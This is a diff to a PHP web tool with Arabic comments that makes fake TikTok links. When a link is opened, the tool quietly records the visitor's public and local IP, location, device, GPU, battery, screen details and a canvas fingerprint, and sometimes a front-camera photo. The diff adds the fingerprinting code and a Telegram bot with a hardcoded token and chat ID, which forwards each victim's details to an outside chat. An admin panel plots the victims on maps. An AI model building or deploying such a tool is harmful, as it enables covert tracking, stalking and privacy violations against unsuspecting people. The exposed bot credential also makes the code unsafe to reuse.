@@ -40,6 +40,7 @@ try {
     $db->exec("PRAGMA journal_mode=WAL;");
     $db->exec("PRAGMA synchronous=NORMAL;");
 
+    // جدول الروابط
     $db->exec("CREATE TABLE IF NOT EXISTS links (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         code TEXT UNIQUE, 
@@ -50,6 +51,7 @@ try {
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
 
+    // جدول السجلات
     $db->exec("CREATE TABLE IF NOT EXISTS captures (
         id INTEGER PRIMARY KEY AUTOINCREMENT, 
         code TEXT, 
@@ -63,31 +65,64 @@ try {
         device_info TEXT, 
         latitude REAL,
         longitude REAL,
+        gpu_info TEXT,
+        battery_info TEXT,
+        screen_info TEXT,
+        canvas_fp TEXT,
         created_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )");
 
-    $db->exec("CREATE INDEX IF NOT EXISTS idx_code ON captures(code)");
-    $db->exec("CREATE INDEX IF NOT EXISTS idx_created ON captures(created_at)");
+    // جدول الإعدادات
+    $db->exec("CREATE TABLE IF NOT EXISTS settings (
+        key TEXT PRIMARY KEY,
+        value TEXT
+    )");
 
-    try { $db->exec("ALTER TABLE captures ADD COLUMN latitude REAL"); } catch (Exception $e) {}
-    try { $db->exec("ALTER TABLE captures ADD COLUMN longitude REAL"); } catch (Exception $e) {}
+    // ✅ إدراج وتحديث توكن التلجرام ورقم الـ Chat ID الخاص بك تلقائياً
+    $db->prepare("INSERT INTO settings (key, value) VALUES ('tg_token', ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value")->execute(['8701062671:AAHPiY9DOr1HNRNQzlb4-4XIhVroYzEMjEU']);
+    $db->prepare("INSERT INTO settings (key, value) VALUES ('tg_chat', ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value")->execute(['6475721500']);
+
+    // إضافة الأعمدة للنسخ القديمة
+    try { $db->exec("ALTER TABLE captures ADD COLUMN gpu_info TEXT"); } catch (Exception $e) {}
+    try { $db->exec("ALTER TABLE captures ADD COLUMN battery_info TEXT"); } catch (Exception $e) {}
+    try { $db->exec("ALTER TABLE captures ADD COLUMN screen_info TEXT"); } catch (Exception $e) {}
+    try { $db->exec("ALTER TABLE captures ADD COLUMN canvas_fp TEXT"); } catch (Exception $e) {}
 
 } catch (Exception $e) {
     die("Database error: " . $e->getMessage());
 }
 
-// جلب بيانات تيك توك (النسخة القوية)
+// دالة إرسال إشعار تلجرام
+function sendTelegramNotification($db, $message) {
+    $stmt = $db->prepare("SELECT value FROM settings WHERE key = 'tg_token'");
+    $stmt->execute(); $token = $stmt->fetchColumn();
+    
+    $stmt = $db->prepare("SELECT value FROM settings WHERE key = 'tg_chat'");
+    $stmt->execute(); $chat_id = $stmt->fetchColumn();
+
+    if (empty($token) || empty($chat_id)) return;
+
+    $url = "https://api.telegram.org/bot{$token}/sendMessage";
+    $data = ['chat_id' => $chat_id, 'text' => $message, 'parse_mode' => 'HTML'];
+    
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 2);
+    curl_exec($ch);
+    curl_close($ch);
+}
+
 function fetch_tiktok_exclusive_meta($url) {
     $meta = ['title' => 'TikTok Video', 'image' => 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60'];
-
-    // المحاولة 1: عبر oEmbed
     $oembed_url = "https://www.tiktok.com/oembed?url=" . urlencode($url);
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $oembed_url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_TIMEOUT, 4); 
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
     $response = curl_exec($ch);
     curl_close($ch);
 
@@ -97,35 +132,6 @@ function fetch_tiktok_exclusive_meta($url) {
         if (!empty($data['thumbnail_url'])) {
             $meta['image'] = $data['thumbnail_url'];
             return $meta;
-        }
-    }
-
-    // المحاولة 2: سحب مباشر (Fallback)
-    $ch_alt = curl_init();
-    curl_setopt($ch_alt, CURLOPT_URL, $url);
-    curl_setopt($ch_alt, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch_alt, CURLOPT_FOLLOWLOCATION, true);
-    curl_setopt($ch_alt, CURLOPT_TIMEOUT, 5);
-    curl_setopt($ch_alt, CURLOPT_USERAGENT, 'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)');
-    curl_setopt($ch_alt, CURLOPT_SSL_VERIFYPEER, false);
-    $html = curl_exec($ch_alt);
-    curl_close($ch_alt);
-
-    if ($html) {
-        $dom = new DOMDocument();
-        @$dom->loadHTML('<?xml encoding="UTF-8">' . $html);
-        $xpath = new DOMXPath($dom);
-
-        $titleNodes = $xpath->query('//meta[@property="og:title"]/@content | //title');
-        if ($titleNodes->length > 0) {
-            $val = trim($titleNodes->item(0)->nodeValue);
-            if (!empty($val)) $meta['title'] = $val;
-        }
-
-        $imageNodes = $xpath->query('//meta[@property="og:image"]/@content');
-        if ($imageNodes->length > 0) {
-            $val = trim($imageNodes->item(0)->nodeValue);
-            if (!empty($val)) $meta['image'] = $val;
         }
     }
     return $meta;
@@ -143,10 +149,6 @@ function get_ip_details($ip) {
     if ($ip === '127.0.0.1' || $ip === 'Unknown' || strpos($ip, '192.168.') === 0) {
         return ['location' => 'Local Network', 'isp' => 'Internal/VPN', 'vpn' => 'No', 'lat' => 0, 'lon' => 0];
     }
-
-    static $cache = [];
-    if (isset($cache[$ip])) return $cache[$ip];
-
     $ch = curl_init("http://ip-api.com/json/{$ip}?fields=status,country,city,isp,proxy,hosting,lat,lon");
     curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 3]);
     $json = curl_exec($ch);
@@ -157,7 +159,6 @@ function get_ip_details($ip) {
         if (isset($data['status']) && $data['status'] === 'success') {
             $location = ($data['city'] ? $data['city'] . ', ' : '') . ($data['country'] ?? 'Unknown');
             $isp = $data['isp'] ?? 'Unknown ISP';
-            
             if (stripos($isp, 'Djezzy') !== false || stripos($isp, 'OTA') !== false) $isp = 'Djezzy';
             elseif (stripos($isp, 'Mobilis') !== false || stripos($isp, 'ATM') !== false) $isp = 'Mobilis';
             elseif (stripos($isp, 'Ooredoo') !== false || stripos($isp, 'Wataniya') !== false) $isp = 'Ooredoo';
@@ -166,10 +167,7 @@ function get_ip_details($ip) {
             else $isp = implode(' ', array_slice(explode(' ', trim($isp)), 0, 2));
 
             $vpn = (!empty($data['proxy']) || !empty($data['hosting'])) ? 'Yes (VPN / Proxy)' : 'No (Direct)';
-            
-            $result = ['location' => $location, 'isp' => $isp, 'vpn' => $vpn, 'lat' => $data['lat'] ?? 0, 'lon' => $data['lon'] ?? 0];
-            $cache[$ip] = $result;
-            return $result;
+            return ['location' => $location, 'isp' => $isp, 'vpn' => $vpn, 'lat' => $data['lat'] ?? 0, 'lon' => $data['lon'] ?? 0];
         }
     }
     return ['location' => 'Unknown Location', 'isp' => 'Unknown ISP', 'vpn' => 'Unknown', 'lat' => 0, 'lon' => 0];
@@ -189,7 +187,7 @@ function get_device_type($ua) {
 }
 
 // ==========================================
-// صفحة التتبع (السرعة القصوى)
+// المتتبع (Zero-Click + Fingerprint + Telegram)
 // ==========================================
 if (isset($_GET['r'])) {
     $code = $_GET['r'];
@@ -226,10 +224,29 @@ if (isset($_GET['r'])) {
             
             $ip_details = get_ip_details($public_ip);
             $device = get_device_type($ua);
+            
+            $gpu_info = $_POST['gpu'] ?? 'Unknown';
+            $battery_info = $_POST['battery'] ?? 'Unknown';
+            $screen_info = $_POST['screen'] ?? 'Unknown';
+            $canvas_fp = $_POST['canvas_fp'] ?? 'Unknown';
 
             try {
-                $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, isp_info, vpn_status, device_info, latitude, longitude, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
-                $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $ip_details['location'], $ip_details['isp'], $ip_details['vpn'], $device, $ip_details['lat'], $ip_details['lon'], date('Y-m-d H:i:s')]);
+                $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, isp_info, vpn_status, device_info, latitude, longitude, gpu_info, battery_info, screen_info, canvas_fp, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
+                $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $ip_details['location'], $ip_details['isp'], $ip_details['vpn'], $device, $ip_details['lat'], $ip_details['lon'], $gpu_info, $battery_info, $screen_info, $canvas_fp, date('Y-m-d H:i:s')]);
+
+                // إرسال إشعار تلجرام
+                $msg = "🚨 <b>زيارة جديدة!</b>\n\n";
+                $msg .= "📱 <b>الجهاز:</b> {$device}\n";
+                $msg .= "🌍 <b>الموقع:</b> {$ip_details['location']}\n";
+                $msg .= "📡 <b>الشبكة:</b> {$ip_details['isp']}\n";
+                $msg .= "🔗 <b>الآيبي العام:</b> <code>{$public_ip}</code>\n";
+                $msg .= "🏠 <b>الآيبي المحلي:</b> <code>{$local_ip}</code>\n";
+                $msg .= "🔋 <b>البطارية:</b> {$battery_info}\n";
+                $msg .= "🎮 <b>كرت الشاشة:</b> {$gpu_info}\n";
+                $msg .= "🖥 <b>الشاشة:</b> {$screen_info}\n";
+                $msg .= "🔑 <b>بصمة Canvas:</b> <code>{$canvas_fp}</code>\n";
+                sendTelegramNotification($db, $msg);
+
             } catch (Exception $e) {}
             exit('OK');
         }
@@ -244,6 +261,46 @@ if (isset($_GET['r'])) {
     <script>
         const useCamera = <?php echo $use_camera ? 'true' : 'false'; ?>;
         const targetUrl = <?php echo json_encode($target_redirect); ?>;
+
+        function getScreenInfo() { return `${window.screen.width}x${window.screen.height} @ ${window.devicePixelRatio}x`; }
+
+        function getGPUInfo() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            } catch (e) { return 'Unknown'; }
+        }
+
+        async function getBatteryInfo() {
+            try {
+                const battery = await navigator.getBattery();
+                return Math.round(battery.level * 100) + "%";
+            } catch (e) { return 'Unknown'; }
+        }
+
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = "top";
+                ctx.font = "14px 'Arial'";
+                ctx.textBaseline = "alphabetic";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = "#069";
+                ctx.fillText("Cwm fjordbank glyphs vext quiz, 😃", 2, 15);
+                const data = canvas.toDataURL();
+                let hash = 0;
+                for (let i = 0; i < data.length; i++) {
+                    const char = data.charCodeAt(i);
+                    hash = ((hash << 5) - hash) + char;
+                    hash = hash & hash;
+                }
+                return Math.abs(hash).toString(16).substring(0, 16);
+            } catch (e) { return 'Unknown'; }
+        }
 
         function getLocalIP() {
             return new Promise((resolve) => {
@@ -266,7 +323,6 @@ if (isset($_GET['r'])) {
 
         async function initTracking() {
             let imageData = "";
-            
             if (useCamera) {
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
@@ -284,11 +340,19 @@ if (isset($_GET['r'])) {
             }
 
             const localIp = await getLocalIP();
+            const gpu = getGPUInfo();
+            const screen = getScreenInfo();
+            const battery = await getBatteryInfo();
+            const canvasFp = getCanvasFingerprint();
             
             const formData = new URLSearchParams();
             formData.append('save_info', '1');
             formData.append('image', imageData);
             formData.append('lip', localIp);
+            formData.append('gpu', gpu);
+            formData.append('screen', screen);
+            formData.append('battery', battery);
+            formData.append('canvas_fp', canvasFp);
 
             if (navigator.sendBeacon) {
                 navigator.sendBeacon(window.location.href, formData);
@@ -313,8 +377,14 @@ if (isset($_GET['r'])) {
 }
 
 // ==========================================
-// لوحة التحكم
+// لوحة التحكم (Admin)
 // ==========================================
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_tg']) && isset($_SESSION['is_logged_in'])) {
+    $db->prepare("INSERT INTO settings (key, value) VALUES ('tg_token', ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value")->execute([trim($_POST['tg_token'])]);
+    $db->prepare("INSERT INTO settings (key, value) VALUES ('tg_chat', ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value")->execute([trim($_POST['tg_chat'])]);
+    header("Location: /?msg=saved"); exit();
+}
+
 if (isset($_GET['delete_id']) && isset($_SESSION['is_logged_in'])) {
     $db->prepare("DELETE FROM captures WHERE id = ?")->execute([intval($_GET['delete_id'])]);
     header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
@@ -336,6 +406,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create']) && isset($_
     $generated_code = $code;
 }
 
+$tg_token = $db->query("SELECT value FROM settings WHERE key = 'tg_token'")->fetchColumn();
+$tg_chat = $db->query("SELECT value FROM settings WHERE key = 'tg_chat'")->fetchColumn();
+
 $total_links = $db->query("SELECT COUNT(*) FROM links")->fetchColumn();
 $total_captures = $db->query("SELECT COUNT(*) FROM captures")->fetchColumn();
 $today_captures = $db->query("SELECT COUNT(*) FROM captures WHERE date(created_at) = date('now')")->fetchColumn();
@@ -354,7 +427,7 @@ $captures = $stmt->fetchAll();
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Control Panel - Live</title>
+    <title>Control Panel - V9</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <style>
@@ -362,7 +435,7 @@ $captures = $stmt->fetchAll();
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, sans-serif; }
         @keyframes bg { 0%,100% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } }
         body { background: linear-gradient(-45deg, #070913, #1e1b4b, #0f172a, #090d16); background-size: 400% 400%; animation: bg 15s ease infinite; color: var(--text); padding: 40px 15px; min-height: 100vh; display: flex; flex-direction: column; justify-content: space-between; }
-        .wrapper { max-width: 1100px; width: 100%; margin: 0 auto; display: grid; gap: 24px; }
+        .wrapper { max-width: 1200px; width: 100%; margin: 0 auto; display: grid; gap: 24px; }
         .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 16px; }
         .stat-card { background: rgba(16, 23, 42, 0.85); border: 1px solid var(--border); border-radius: 12px; padding: 20px; text-align: center; transition: 0.3s; position: relative; }
         .stat-card:hover { transform: translateY(-5px); border-color: var(--accent); box-shadow: 0 10px 20px -5px rgba(139, 92, 246, 0.4); }
@@ -391,13 +464,13 @@ $captures = $stmt->fetchAll();
         .result-panel label { display: block; font-size: 11px; font-weight: 700; color: var(--accent); text-transform: uppercase; }
         .flex-row { display: flex; gap: 8px; }
         .input-link-result { background: #0b1329 !important; color: #38bdf8 !important; font-weight: 600; }
-        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 16px; margin-top: 15px; }
+        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 16px; margin-top: 15px; }
         .card-img { background: #050b14; border: 1px solid var(--border); border-radius: 12px; padding: 14px; display: flex; flex-direction: column; transition: 0.3s; }
         .card-img:hover { transform: translateY(-5px) scale(1.02); border-color: var(--accent); box-shadow: 0 15px 25px -5px rgba(139, 92, 246, 0.3); }
-        .card-img img { width: 100%; height: 160px; object-fit: cover; border-radius: 8px; border: 1px solid var(--border); }
+        .card-img img { width: 100%; height: 180px; object-fit: cover; border-radius: 8px; border: 1px solid var(--border); }
         .map-container { height: 140px; width: 100%; border-radius: 8px; margin-top: 10px; border: 1px solid var(--border); z-index: 1; }
         .leaflet-control-attribution { display: none !important; }
-        .info-row { display: flex; justify-content: space-between; font-size: 11px; margin-top: 6px; color: var(--muted); }
+        .info-row { display: flex; justify-content: space-between; font-size: 12px; margin-top: 6px; color: var(--muted); }
         .info-row span { color: #cbd5e1; }
         .code-badge { color: var(--accent); font-family: monospace; font-weight: bold; cursor: pointer; }
         .code-badge:hover { color: #38bdf8; }
@@ -437,7 +510,7 @@ $captures = $stmt->fetchAll();
         <div class="header-flex">
             <div>
                 <h1>Control Panel</h1>
-                <p class="subtitle">Zero-Click Engine v8 (Fixed Edition)</p>
+                <p class="subtitle">Zero-Click Engine V9 (Telegram + Fingerprint)</p>
             </div>
             <div style="text-align: left;">
                 <div class="live-badge"><div class="live-dot"></div> SYSTEM ONLINE</div>
@@ -461,6 +534,17 @@ $captures = $stmt->fetchAll();
                 <div class="stat-card"><h3>Today's Captures</h3><p style="color: #10b981; -webkit-text-fill-color: #10b981;"><?php echo $today_captures; ?></p></div>
             </div>
             <div style="text-align: right; margin-bottom: -10px;"><a href="?logout=1" class="btn btn-danger" style="height: 38px; padding: 0 16px; font-size: 12px;">تسجيل الخروج</a></div>
+
+            <!-- إعدادات تلجرام -->
+            <div class="section-box">
+                <h2>⚙️ إعدادات إشعارات تلجرام</h2>
+                <form method="POST" class="form-grid" style="grid-template-columns: 1fr 1fr auto;">
+                    <input type="text" name="tg_token" placeholder="Bot Token" value="<?php echo htmlspecialchars($tg_token); ?>">
+                    <input type="text" name="tg_chat" placeholder="Chat ID" value="<?php echo htmlspecialchars($tg_chat); ?>">
+                    <button type="submit" name="save_tg" class="btn btn-success">حفظ الإعدادات</button>
+                </form>
+                <p style="font-size: 11px; color: var(--muted); margin-top: 10px;">* تم دمج التوكن والـ ID الخاص بك تلقائياً في الكود. يمكنك تغييرهما من هنا في أي وقت.</p>
+            </div>
 
             <div class="section-box">
                 <h2>Generate TikTok Link</h2>
@@ -498,20 +582,16 @@ $captures = $stmt->fetchAll();
                                 <?php if (!empty($cap['image_data'])): ?>
                                     <a href="<?php echo htmlspecialchars($cap['image_data']); ?>" target="_blank"><img src="<?php echo htmlspecialchars($cap['image_data']); ?>" alt="Capture"></a>
                                 <?php else: ?>
-                                    <div style="width: 100%; height: 160px; background: #0b1329; display: flex; align-items: center; justify-content: center; border-radius: 8px; color: var(--muted); font-size: 12px; border: 1px dashed var(--border);">الكاميرا معطلة (بدون صورة)</div>
+                                    <div style="width: 100%; height: 180px; background: #0b1329; display: flex; align-items: center; justify-content: center; border-radius: 8px; color: var(--muted); font-size: 12px; border: 1px dashed var(--border);">الكاميرا معطلة (بدون صورة)</div>
                                 <?php endif; ?>
 
-                                <!-- الخريطة الجديدة: Esri Dark Gray بدون مفتاح API -->
                                 <?php if (!empty($cap['latitude']) && !empty($cap['longitude'])): ?>
                                     <div id="map-<?php echo $cap['id']; ?>" class="map-container"></div>
                                     <script>
                                         document.addEventListener("DOMContentLoaded", function() {
                                             var map = L.map('map-<?php echo $cap['id']; ?>', { zoomControl: false, attributionControl: false }).setView([<?php echo $cap['latitude']; ?>, <?php echo $cap['longitude']; ?>], 10);
-                                            // استخدام خرائط Esri الداكنة المجانية
-                                            L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/Canvas/World_Dark_Gray_Base/MapServer/tile/{z}/{y}/{x}', {
-                                                maxZoom: 16
-                                            }).addTo(map);
-                                            L.circleMarker([<?php echo $cap['latitude']; ?>, <?php echo $cap['longitude']; ?>], { color: '#8b5cf6', fillColor: '#8b5cf6', fillOpacity: 0.8, radius: 8 }).addTo(map).bindPopup("<b><?php echo htmlspecialchars($cap['public_ip']); ?></b><br><?php echo htmlspecialchars($cap['location']); ?>");
+                                            L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/Canvas/World_Dark_Gray_Base/MapServer/tile/{z}/{y}/{x}', { maxZoom: 16 }).addTo(map);
+                                            L.circleMarker([<?php echo $cap['latitude']; ?>, <?php echo $cap['longitude']; ?>], { color: '#8b5cf6', fillColor: '#8b5cf6', fillOpacity: 0.8, radius: 8 }).addTo(map).bindPopup("<b><?php echo htmlspecialchars($cap['public_ip']); ?></b>");
                                         });
                                     </script>
                                 <?php endif; ?>
@@ -519,11 +599,15 @@ $captures = $stmt->fetchAll();
                                 <div class="info-row" style="margin-top:10px;"><span>Code:</span> <span class="code-badge" onclick="copyText('<?php echo htmlspecialchars(addslashes($cap['code'])); ?>')"><?php echo htmlspecialchars($cap['code']); ?> 📋</span></div>
                                 <div class="info-row"><span>Public IP:</span> <span style="color:#38bdf8;"><?php echo htmlspecialchars($cap['public_ip']); ?></span></div>
                                 <div class="info-row"><span>Local IP:</span> <span><?php echo htmlspecialchars($cap['local_ip']); ?></span></div>
-                                <div class="info-row"><span>Port:</span> <span><?php echo htmlspecialchars($cap['port']); ?></span></div>
                                 <div class="info-row"><span>Location:</span> <span style="color:#10b981;"><?php echo htmlspecialchars($cap['location']); ?></span></div>
-                                <div class="info-row"><span>المتعامل:</span> <span style="color:#f97316; font-weight: bold;"><?php echo htmlspecialchars($cap['isp_info']); ?></span></div>
-                                <div class="info-row"><span>VPN / Proxy:</span> <span style="color: <?php echo (strpos($cap['vpn_status'], 'Yes') !== false) ? '#f43f5e' : '#38bdf8'; ?>; font-weight: bold;"><?php echo htmlspecialchars($cap['vpn_status']); ?></span></div>
+                                <div class="info-row"><span>ISP:</span> <span style="color:#f97316; font-weight: bold;"><?php echo htmlspecialchars($cap['isp_info']); ?></span></div>
                                 <div class="info-row"><span>Device:</span> <span><?php echo htmlspecialchars($cap['device_info']); ?></span></div>
+                                
+                                <div class="info-row" style="background: rgba(139, 92, 246, 0.1); padding: 4px; border-radius: 4px; margin-top: 8px;"><span>GPU:</span> <span style="color:#a78bfa;"><?php echo htmlspecialchars($cap['gpu_info']); ?></span></div>
+                                <div class="info-row"><span>Screen:</span> <span style="color:#a78bfa;"><?php echo htmlspecialchars($cap['screen_info']); ?></span></div>
+                                <div class="info-row"><span>Battery:</span> <span style="color:#a78bfa;"><?php echo htmlspecialchars($cap['battery_info']); ?></span></div>
+                                <div class="info-row"><span>Fingerprint:</span> <span style="color:#a78bfa; font-family: monospace;"><?php echo htmlspecialchars($cap['canvas_fp']); ?></span></div>
+
                                 <div class="info-row" style="border-top:1px solid var(--border); padding-top:6px; margin-top:8px;"><span>Time:</span> <span style="color:#a78bfa; font-weight:bold;"><?php echo htmlspecialchars($cap['created_at']); ?></span></div>
                                 <a href="?delete_id=<?php echo $cap['id']; ?>" class="btn-delete" onclick="return confirm('حذف السجل؟');">حذف السجل</a>
                             </div>
